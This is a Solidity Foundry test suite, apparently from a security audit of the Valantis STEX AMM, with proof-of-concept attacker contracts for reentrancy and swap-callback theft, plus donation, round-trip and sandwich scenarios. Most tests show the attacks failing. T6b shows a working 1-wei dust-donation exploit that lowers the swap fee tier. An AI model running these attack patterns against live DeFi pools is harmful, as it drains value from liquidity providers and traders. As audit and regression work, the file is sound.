// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

// Worker C PoC suite — Valantis STEX reentrancy / flash-loan / MEV angles.
// Tests the IN-SCOPE contracts (STEXAMM, stHYPEWithdrawalModule) against the
// repo's own mocks + the pinned valantis-core. Each test targets one lead
// from the work log: most are expected to FAIL TO EXPLOIT (fix present /
// unprofitable), which is itself the evidence. Nothing here submits anything.

import {console} from "forge-std/console.sol";
import {Test} from "forge-std/Test.sol";

import {ProtocolFactory} from "@valantis-core/protocol-factory/ProtocolFactory.sol";
import {SovereignPoolFactory} from "@valantis-core/pools/factories/SovereignPoolFactory.sol";
import {ISovereignPool} from "@valantis-core/pools/interfaces/ISovereignPool.sol";
import {SovereignPoolSwapParams, SovereignPoolSwapContextData} from "@valantis-core/pools/structs/SovereignPoolStructs.sol";
import {IFlashBorrower} from "@valantis-core/pools/interfaces/IFlashBorrower.sol";
import {ISovereignPoolSwapCallback} from "@valantis-core/pools/interfaces/ISovereignPoolSwapCallback.sol";
import {WETH} from "@solmate/tokens/WETH.sol";

import {STEXAMM} from "src/STEXAMM.sol";
import {IWETH9} from "src/interfaces/IWETH9.sol";
import {StepwiseFeeModule} from "src/swap-fee-modules/StepwiseFeeModule.sol";
import {stHYPEWithdrawalModule} from "src/withdrawal-modules/stHYPEWithdrawalModule.sol";
import {MockOverseer} from "src/mocks/sthype/MockOverseer.sol";
import {MockStHype} from "src/mocks/sthype/MockStHype.sol";
import {MockLendingPool} from "src/mocks/MockLendingPool.sol";
import {AaveLendingModule} from "src/lending-modules/AaveLendingModule.sol";

// Attacker contract for T1: during the pool swap callback it tries to call
// withdrawalModule.update() so the surplus gets counted as its swap payment.
contract SwapCallbackThief is ISovereignPoolSwapCallback {
    stHYPEWithdrawalModule public immutable module;
    bool public updateCalled;
    bool public updateSucceeded;
    bool public payInCallback;

    constructor(address _module) {
        module = stHYPEWithdrawalModule(payable(_module));
    }

    function setPayInCallback(bool _pay) external {
        payInCallback = _pay;
    }

    function sovereignPoolSwapCallback(address _tokenIn, uint256 _amountInUsed, bytes calldata) external override {
        updateCalled = true;
        try module.update() {
            updateSucceeded = true;
        } catch {
            updateSucceeded = false;
        }
        // Optionally pay for the swap out of pocket (fair payment) so the
        // swap can complete and the callback's effects persist for assertion.
        // With payInCallback=false this is the exact Hexens PoC shape: the
        // attacker pays nothing and relies on update().
        if (payInCallback) {
            IWETH9(_tokenIn).transfer(msg.sender, _amountInUsed);
        }
    }

    receive() external payable {}
}

// Attacker contract for T2b: recipient of a withdraw (unwrapped to native
// ETH). In receive() it tries to re-enter withdrawalModule.claim() for the
// request its own withdraw just created.
contract ReentrantClaimer {
    stHYPEWithdrawalModule public immutable module;
    uint256 public claimId;
    bool public claimAttempted;
    bool public claimSucceeded;

    constructor(address _module) {
        module = stHYPEWithdrawalModule(payable(_module));
    }

    function setClaimId(uint256 _id) external {
        claimId = _id;
    }

    receive() external payable {
        claimAttempted = true;
        try module.claim(claimId) {
            claimSucceeded = true;
        } catch {
            claimSucceeded = false;
        }
    }
}

contract WorkerCPoC is Test {
    STEXAMM stex;
    StepwiseFeeModule swapFeeModule;
    stHYPEWithdrawalModule withdrawalModule;
    ProtocolFactory protocolFactory;
    WETH weth;
    MockStHype token0;
    MockOverseer overseer;
    MockLendingPool lendingPool;
    AaveLendingModule lendingModule;
    ISovereignPool pool;

    address public poolFeeRecipient1 = makeAddr("POOL_FEE_RECIPIENT_1");
    address public poolFeeRecipient2 = makeAddr("POOL_FEE_RECIPIENT_2");
    address public owner = makeAddr("OWNER");
    address public wstHYPE = makeAddr("WSTHYPE");

    function setUp() public {
        token0 = new MockStHype();
        weth = new WETH();
        overseer = new MockOverseer(address(token0));
        protocolFactory = new ProtocolFactory(address(this));
        address sovereignPoolFactory = address(new SovereignPoolFactory());
        protocolFactory.setSovereignPoolFactory(sovereignPoolFactory);
        lendingPool = new MockLendingPool(address(weth));
        withdrawalModule = new stHYPEWithdrawalModule(address(overseer), wstHYPE, address(this));
        swapFeeModule = new StepwiseFeeModule(owner);
        stex = new STEXAMM(
            "Stake Exchange LP",
            "STEX LP",
            address(token0),
            address(weth),
            address(swapFeeModule),
            address(protocolFactory),
            poolFeeRecipient1,
            poolFeeRecipient2,
            owner,
            address(withdrawalModule),
            0
        );
        withdrawalModule.setSTEX(address(stex));
        vm.startPrank(owner);
        swapFeeModule.setPool(stex.pool());
        vm.stopPrank();
        lendingModule = new AaveLendingModule(
            address(lendingPool),
            lendingPool.lendingPoolYieldToken(),
            address(weth),
            address(withdrawalModule),
            address(0x123),
            2
        );
        withdrawalModule.proposeLendingModule(address(lendingModule), 3 days);
        vm.warp(block.timestamp + 3 days);
        withdrawalModule.setProposedLendingModule();
        pool = ISovereignPool(stex.pool());
        vm.deal(address(this), 5000 ether);
        weth.deposit{value: 500 ether}();
        token0.mint{value: 500 ether}(address(this));
        token0.approve(address(pool), 500 ether);
        weth.approve(address(pool), type(uint256).max);
        weth.approve(address(stex), type(uint256).max);
        token0.approve(address(stex), 500 ether);
    }

    function _setFeeParams(uint256 minT, uint256 maxT, uint32[] memory steps) internal {
        vm.startPrank(owner);
        swapFeeModule.setFeeParamsToken0(minT, maxT, steps);
        vm.stopPrank();
    }

    function _feeParamsTiny() internal {
        uint32[] memory steps = new uint32[](1);
        steps[0] = 1;
        _setFeeParams(15 ether, 30 ether, steps);
    }

    function _swap(
        bool isZeroToOne,
        uint256 amountIn,
        uint256 amountOutMin,
        address recipient,
        bool isSwapCallback,
        address tokenOut
    ) internal returns (uint256 amountInUsed, uint256 amountOut) {
        SovereignPoolSwapParams memory params;
        params.isSwapCallback = isSwapCallback;
        params.isZeroToOne = isZeroToOne;
        params.amountIn = amountIn;
        params.amountOutMin = amountOutMin;
        params.deadline = block.timestamp;
        params.recipient = recipient;
        params.swapTokenOut = tokenOut;
        (amountInUsed, amountOut) = pool.swap(params);
    }

    function _deposit(uint256 amount, address recipient) internal returns (uint256 shares) {
        shares = stex.deposit(amount, 0, block.timestamp, recipient);
    }

    // ---------------------------------------------------------------- T1
    // Hexens Mar-25 Critical "Direct theft of surplus balance when unstaking
    // stHYPE" — REGRESSION TEST. Attacker swaps token1->token0 via callback
    // and calls update() inside the callback so the module's surplus pays
    // for the swap. Fixed by whenPoolNotLocked on update().
    // Expectation: update() FAILS inside the swap callback (pool locked);
    // the swap only completes because the thief pays out of pocket; the
    // module keeps its 5 ETH surplus until a legitimate update() outside
    // any swap. (A no-payment variant of this swap reverts in the pool's
    // post-callback balance check — verified separately in the trace.)
    function test_T1_SwapCallbackSurplusTheft_Blocked() public {
        _feeParamsTiny();
        // Seed pool: 10 token1 deposits + 10 token0 (as if from swaps).
        _deposit(10 ether, address(this));
        token0.mint{value: 10 ether}(address(pool));

        // Owner unstakes 5 token0 -> module holds 5 token0, burn id 0.
        withdrawalModule.unstakeToken0Reserves(5 ether);
        assertEq(withdrawalModule.amountToken0PendingUnstaking(), 5 ether);

        // Overseer settles the burn: module now holds 5 native ETH surplus.
        vm.deal(address(overseer), 5 ether);
        overseer.settleBurn(0);
        assertEq(address(withdrawalModule).balance, 5 ether);

        // Attacker contract, funded with its own 5 WETH, tries the Hexens theft.
        SwapCallbackThief thief = new SwapCallbackThief(address(withdrawalModule));
        thief.setPayInCallback(true);
        weth.transfer(address(thief), 5 ether);
        SovereignPoolSwapParams memory params;
        params.isSwapCallback = true;
        params.isZeroToOne = false; // token1 -> token0
        params.amountIn = 5 ether;
        params.amountOutMin = 0;
        params.deadline = block.timestamp;
        params.recipient = address(thief);
        params.swapTokenOut = address(token0);

        vm.prank(address(thief));
        (uint256 amountInUsed, uint256 amountOut) = pool.swap(params);
        assertEq(amountInUsed, 5 ether);
        assertEq(amountOut, 5 ether);

        assertTrue(thief.updateCalled(), "callback should have run");
        assertFalse(thief.updateSucceeded(), "update() must fail inside swap callback");
        assertEq(address(withdrawalModule).balance, 5 ether, "surplus must stay in module");
        assertEq(token0.balanceOf(address(thief)), 5 ether, "thief only gets what it paid for");
        assertEq(weth.balanceOf(address(thief)), 0, "thief paid out of pocket");

        // Control: update() OUTSIDE a swap still works and moves surplus to pool.
        (uint256 r0Before, uint256 r1Before) = pool.getReserves();
        withdrawalModule.update();
        assertEq(address(withdrawalModule).balance, 0);
        (uint256 r0After, uint256 r1After) = pool.getReserves();
        assertEq(r1After, r1Before + 5 ether, "surplus lands in pool as token1");
        assertEq(r0After, r0Before);
        console.log("T1 PASS: swap-callback surplus theft blocked; update() works outside swap");
    }

    // ------------------------------------------------------------- T1c
    // Same as T1 but the thief holds NO WETH and relies entirely on
    // update() to fund the swap (exact Hexens PoC shape).
    // Expectation: the swap REVERTS (update() blocked, then the pool's
    // post-callback balance check fails) and the surplus stays put.
    function test_T1c_SwapCallbackNoPayment_Reverts() public {
        _feeParamsTiny();
        _deposit(10 ether, address(this));
        token0.mint{value: 10 ether}(address(pool));
        withdrawalModule.unstakeToken0Reserves(5 ether);
        vm.deal(address(overseer), 5 ether);
        overseer.settleBurn(0);
        assertEq(address(withdrawalModule).balance, 5 ether);

        SwapCallbackThief thief = new SwapCallbackThief(address(withdrawalModule));
        assertEq(weth.balanceOf(address(thief)), 0);
        SovereignPoolSwapParams memory params;
        params.isSwapCallback = true;
        params.isZeroToOne = false;
        params.amountIn = 5 ether;
        params.amountOutMin = 0;
        params.deadline = block.timestamp;
        params.recipient = address(thief);
        params.swapTokenOut = address(token0);

        vm.prank(address(thief));
        vm.expectRevert();
        pool.swap(params);

        assertEq(address(withdrawalModule).balance, 5 ether, "surplus must stay in module");
        assertEq(token0.balanceOf(address(thief)), 0, "thief must get no token0");
        console.log("T1c PASS: no-payment swap-callback theft reverts");
    }

    // ------------------------------------------------------------- T1b
    // Pool flash loans must be disabled for BOTH tokens (both marked rebase).
    function test_T1b_PoolFlashLoan_DisabledForBothTokens() public {
        IFlashBorrower dummy = IFlashBorrower(address(0x1234));
        vm.expectRevert();
        pool.flashLoan(true, dummy, 1 ether, "");
        vm.expectRevert();
        pool.flashLoan(false, dummy, 1 ether, "");
        console.log("T1b PASS: pool.flashLoan reverts for token0 and token1 (rebase)");
    }

    // ---------------------------------------------------------------- T2a
    // Hexens Mar-25 High "Withdrawal queue priority bypass" — REGRESSION
    // TEST on current code (checkpoint now uses cumulative LP withdrawals).
    // User1 withdraws (request 0), only part settles, user2 withdraws
    // (request 1), then settlement is topped up to req0 + req1/2 — i.e. the
    // queue is NOT fully funded (shortfall = req1/2).
    // Expectation: claim(1) (user2, late) REVERTS, claim(0) (user1) succeeds.
    function test_T2a_QueuePriorityBypass_Fixed() public {
        _feeParamsTiny();
        address user1 = makeAddr("USER1");
        address user2 = makeAddr("USER2");
        _deposit(10 ether, user1);
        token0.mint{value: 10 ether}(address(pool));
        _deposit(1 ether, user2);

        uint256 shares1 = stex.balanceOf(user1);
        uint256 shares2 = stex.balanceOf(user2);

        vm.prank(user1);
        (uint256 a0_1,) = stex.withdraw(shares1, 0, 0, block.timestamp, user1, false, false);
        assertGt(a0_1, 0);

        // Only 5 ETH of user1's unstaking settles.
        vm.deal(address(withdrawalModule), 5 ether);
        withdrawalModule.update();
        assertEq(withdrawalModule.amountToken1ClaimableLPWithdrawal(), 5 ether);

        // User2 withdraws half their shares (creates request 1).
        vm.prank(user2);
        stex.withdraw(shares2 / 2, 0, 0, block.timestamp, user2, false, false);

        // Top settlement up to req0 + req1/2 (queue NOT fully funded).
        uint256 req0 = withdrawalModule.getLPWithdrawals(0).amountToken1;
        uint256 req1 = withdrawalModule.getLPWithdrawals(1).amountToken1;
        assertGt(req0, 5 ether);
        assertGt(req1, 0);
        vm.deal(address(withdrawalModule), req0 + req1 / 2);
        withdrawalModule.update();
        console.log("T2a req0:", req0);
        console.log("T2a req1:", req1);
        console.log("T2a claimable:", withdrawalModule.amountToken1ClaimableLPWithdrawal());

        // User2 (late request) must NOT be able to jump the queue.
        vm.expectRevert(stHYPEWithdrawalModule.stHYPEWithdrawalModule__claim_CannotYetClaim.selector);
        withdrawalModule.claim(1);

        // User1 (early request) claims fine.
        uint256 balBefore = user1.balance;
        withdrawalModule.claim(0);
        assertGt(user1.balance, balBefore);
        console.log("T2a PASS: late claim reverts, early claim succeeds (FIFO holds)");
    }

    // ---------------------------------------------------------------- T2b
    // REENTRANCY VARIANT of T2a: the late withdrawer uses an ETH-receiving
    // recipient contract that tries to claim its own just-created request
    // from inside STEXAMM.withdraw's sendValue hook. The queue is only
    // partly funded at that point (5 of ~9.5 settled).
    // Expectation: the reentrant claim REVERTS (same FIFO check), the outer
    // withdraw still succeeds, and a direct claim(1) afterwards ALSO reverts
    // (reentrancy buys no advantage).
    function test_T2b_ReentrantClaimDuringWithdraw_NoAdvantage() public {
        _feeParamsTiny();
        address user1 = makeAddr("USER1");
        _deposit(10 ether, user1);
        token0.mint{value: 10 ether}(address(pool));

        // User2 = reentrant claimer contract; fund it with WETH for deposit.
        ReentrantClaimer claimer = new ReentrantClaimer(address(withdrawalModule));
        weth.transfer(address(claimer), 1 ether);
        vm.prank(address(claimer));
        weth.approve(address(stex), 1 ether);
        vm.prank(address(claimer));
        uint256 shares2 = stex.deposit(1 ether, 0, block.timestamp, address(claimer));

        uint256 shares1 = stex.balanceOf(user1);
        vm.prank(user1);
        stex.withdraw(shares1, 0, 0, block.timestamp, user1, false, false);

        // Only 5 ETH settles before the claimer's withdraw.
        vm.deal(address(withdrawalModule), 5 ether);
        withdrawalModule.update();
        assertEq(withdrawalModule.amountToken1ClaimableLPWithdrawal(), 5 ether);

        // Claimer withdraws half shares, unwrapped to ETH; its request id is 1.
        uint256 nextId = withdrawalModule.idLPWithdrawal();
        assertEq(nextId, 1);
        claimer.setClaimId(nextId);
        vm.prank(address(claimer));
        stex.withdraw(shares2 / 2, 0, 0, block.timestamp, address(claimer), true, false);

        assertTrue(claimer.claimAttempted(), "receive hook should have run");
        assertFalse(claimer.claimSucceeded(), "reentrant claim must fail FIFO check");

        // Same claim from outside also fails: reentrancy bought nothing.
        vm.expectRevert(stHYPEWithdrawalModule.stHYPEWithdrawalModule__claim_CannotYetClaim.selector);
        withdrawalModule.claim(1);
        console.log("T2b PASS: reentrant queue-jump fails; no advantage over direct claim");
    }

    // ---------------------------------------------------------------- T3
    // Donation / share-price inflation before FIRST deposit.
    // Attacker donates 50 token1 straight to the pool, then first-deposits
    // 10 token1, then withdraws everything. Expectation: NET LOSS exactly
    // 1000 wei + 1000*Y/D (the MINIMUM_LIQUIDITY dilution) — unprofitable.
    function test_T3_DonationBeforeFirstDeposit_LosesMoney() public {
        _feeParamsTiny();
        uint256 Y = 50 ether;
        uint256 D = 10 ether;
        weth.transfer(address(pool), Y);

        uint256 shares = _deposit(D, address(this));
        assertEq(shares, D - 1e3);

        (uint256 amount0, uint256 amount1) = stex.withdraw(shares, 0, 0, block.timestamp, address(this), false, false);
        assertEq(amount0, 0);
        uint256 received = amount1;
        uint256 spent = D + Y;
        uint256 expectedReceived = (Y + D) * (D - 1e3) / D;
        assertEq(received, expectedReceived);
        assertLt(received, spent, "attacker gets back less than donation+deposit");
        int256 pnl = int256(received) - int256(spent);
        console.log("T3 donation Y:");
        console.log(Y);
        console.log("T3 deposit D:");
        console.log(D);
        console.log("T3 received:");
        console.log(received);
        console.log("T3 spent:");
        console.log(spent);
        console.log("T3 pnl (int):");
        console.logInt(pnl);
        assertLt(pnl, 0);
        console.log("T3 PASS: first-deposit donation attack loses money");
    }

    // ---------------------------------------------------------------- T4
    // Deposit -> instant-withdraw round trip (external-capital equivalent of
    // a flash-loan loop; pool flash loans are disabled per T1b).
    // Expectation: round trip LOSES value (instant-withdraw fee + rounding).
    function test_T4_DepositInstantWithdrawRoundTrip_LosesMoney() public {
        _feeParamsTiny();
        uint256 D = 10 ether;
        uint256 wethBefore = weth.balanceOf(address(this));
        uint256 shares = _deposit(D, address(this));
        // Instant-withdraw everything back to token1.
        (uint256 amount0, uint256 amount1) = stex.withdraw(shares, 0, 0, block.timestamp, address(this), false, true);
        assertEq(amount0, 0);
        uint256 wethAfter = weth.balanceOf(address(this));
        console.log("T4 deposited:");
        console.log(D);
        console.log("T4 instant-withdraw received:");
        console.log(amount1);
        assertLt(wethAfter, wethBefore, "round trip must not profit");
        console.log("T4 PASS: deposit->instant-withdraw round trip loses money");
    }

    // ---------------------------------------------------------------- T5
    // Fee-tier sandwich quantification with DEPLOYED-style params, scaled
    // down: thresholds 10/200, steps [3,20,50,200,500] bips (max 5%).
    // Attacker = 90% LP. Victim swaps 50 token0->token1 with NO slippage
    // protection. Scenario A: no front-run. Scenario B: attacker front-runs
    // 40 token0->token1, victim swaps, attacker swaps back (free direction),
    // then attacker exits fully. Compare attacker end wealth (WETH+stHYPE).
    function _sandwichSetup(address attacker, address otherLP, address victim)
        internal
        returns (uint256 attackerShares)
    {
        // Attacker 90 token1, other LP 10 token1; 100 token0 in pool.
        weth.transfer(attacker, 90 ether);
        weth.transfer(otherLP, 10 ether);
        vm.prank(attacker);
        weth.approve(address(stex), 90 ether);
        vm.prank(otherLP);
        weth.approve(address(stex), 10 ether);
        vm.prank(attacker);
        attackerShares = stex.deposit(90 ether, 0, block.timestamp, attacker);
        vm.prank(otherLP);
        stex.deposit(10 ether, 0, block.timestamp, otherLP);
        token0.mint{value: 100 ether}(address(pool));
        // Victim + attacker token0 balances.
        token0.mint{value: 50 ether}(victim);
        token0.mint{value: 40 ether}(attacker);
        vm.prank(victim);
        token0.approve(address(pool), 50 ether);
        vm.prank(attacker);
        token0.approve(address(pool), 40 ether);
        weth.approve(address(pool), type(uint256).max);
    }

    function _victimSwap(address victim) internal returns (uint256 amountOut) {
        vm.prank(victim);
        (, amountOut) = _swap(true, 50 ether, 0, victim, false, address(weth));
    }

    function _attackerExit(address attacker, uint256 shares) internal returns (uint256 wealth) {
        vm.prank(attacker);
        (uint256 a0,) = stex.withdraw(shares, 0, 0, block.timestamp, attacker, false, false);
        // a1 was already paid out as WETH by the withdraw; a0 is a pending
        // claim valued 1:1 (it is owed in full). Both scenarios value claims
        // the same way, so the A-vs-B difference is meaningful.
        wealth = weth.balanceOf(attacker) + token0.balanceOf(attacker) + a0;
    }

    function test_T5a_Sandwich_NoFrontrun_Baseline() public {
        uint32[] memory steps = new uint32[](5);
        steps[0] = 3;
        steps[1] = 20;
        steps[2] = 50;
        steps[3] = 200;
        steps[4] = 500;
        _setFeeParams(10 ether, 200 ether, steps);

        address attacker = makeAddr("ATTACKER");
        address otherLP = makeAddr("OTHERLP");
        address victim = makeAddr("VICTIM");
        uint256 attackerShares = _sandwichSetup(attacker, otherLP, victim);

        uint256 victimOut = _victimSwap(victim);
        console.log("T5a victim amountOut (no frontrun):", victimOut);

        uint256 wealth = _attackerExit(attacker, attackerShares);
        console.log("T5a attacker end wealth (WETH+stHYPE+pending a0):", wealth);
    }

    function test_T5b_Sandwich_WithFrontrun() public {
        uint32[] memory steps = new uint32[](5);
        steps[0] = 3;
        steps[1] = 20;
        steps[2] = 50;
        steps[3] = 200;
        steps[4] = 500;
        _setFeeParams(10 ether, 200 ether, steps);

        address attacker = makeAddr("ATTACKER");
        address otherLP = makeAddr("OTHERLP");
        address victim = makeAddr("VICTIM");
        uint256 attackerShares = _sandwichSetup(attacker, otherLP, victim);

        // Front-run: 40 token0 -> token1 (drains token1 100 -> ~60).
        vm.prank(attacker);
        (, uint256 frontOut) = _swap(true, 40 ether, 0, attacker, false, address(weth));
        console.log("T5b frontrun token1 received:", frontOut);

        uint256 victimOut = _victimSwap(victim);
        console.log("T5b victim amountOut (with frontrun):", victimOut);

        // Back-run: swap the received token1 back to token0 (free direction).
        uint256 backIn = weth.balanceOf(attacker);
        vm.prank(attacker);
        weth.approve(address(pool), backIn);
        vm.prank(attacker);
        (, uint256 backOut) = _swap(false, backIn, 0, attacker, false, address(token0));
        console.log("T5b backrun token0 received:", backOut);

        uint256 wealth = _attackerExit(attacker, attackerShares);
        console.log("T5b attacker end wealth (WETH+stHYPE+pending a0):", wealth);
    }

    // ---------------------------------------------------------------- T6
    // DUST-DONATION FEE-TIER MANIPULATION (new lead, not in any audit).
    // StepwiseFeeModule charges a fee tier based on token1 reserves AFTER
    // the swap; the tier is a step function, so an infinitesimal reserve
    // change at a boundary flips the fee for the WHOLE swap amount.
    // Reserves are raw balances (isToken1Rebase=true), so anyone can donate
    // dust WETH straight to the pool to push reserves across a boundary.
    // Setup (deployed-style params, scaled): thresholds 10/200, steps
    // [3,20,50,200,500] bips. Reserve1Total R=148, swap S=100 -> post-swap
    // reserves A=48, exactly a boundary: fee 500 bips (amountOut ~95.0).
    // A 1-wei donation makes A=48+1wei -> fee 200 bips (amountOut ~98.0).
    // T6a measures the baseline, T6b the donated swap; same setup otherwise.
    function _feeTierSetup(address attacker) internal {
        uint32[] memory steps = new uint32[](5);
        steps[0] = 3;
        steps[1] = 20;
        steps[2] = 50;
        steps[3] = 200;
        steps[4] = 500;
        _setFeeParams(10 ether, 200 ether, steps);
        _deposit(148 ether, address(this));
        token0.mint{value: 100 ether}(attacker);
        vm.prank(attacker);
        token0.approve(address(pool), 100 ether);
    }

    function test_T6a_FeeTier_Baseline() public {
        address attacker = makeAddr("ATTACKER");
        _feeTierSetup(attacker);
        vm.prank(attacker);
        (, uint256 amountOut) = _swap(true, 100 ether, 0, attacker, false, address(weth));
        console.log("T6a amountOut (no donation):");
        console.log(amountOut);
        // Fee tier 500 bips -> amountOut = 100*10000/10526 ~= 95.002
        assertApproxEqAbs(amountOut, 95.002e18, 0.01 ether);
    }

    function test_T6b_FeeTier_DustDonation() public {
        address attacker = makeAddr("ATTACKER");
        _feeTierSetup(attacker);
        // Attacker donates 1 wei of WETH directly to the pool, then swaps.
        weth.transfer(attacker, 1);
        vm.prank(attacker);
        weth.transfer(address(pool), 1);
        vm.prank(attacker);
        (, uint256 amountOut) = _swap(true, 100 ether, 0, attacker, false, address(weth));
        console.log("T6b amountOut (1-wei donation):");
        console.log(amountOut);
        // Fee tier 200 bips -> amountOut = 100*10000/10204 ~= 98.0
        assertApproxEqAbs(amountOut, 98.0e18, 0.01 ether);
        console.log("T6b PASS: 1 wei donation buys ~3 ETH fee discount on a 100 ETH swap");
    }
}
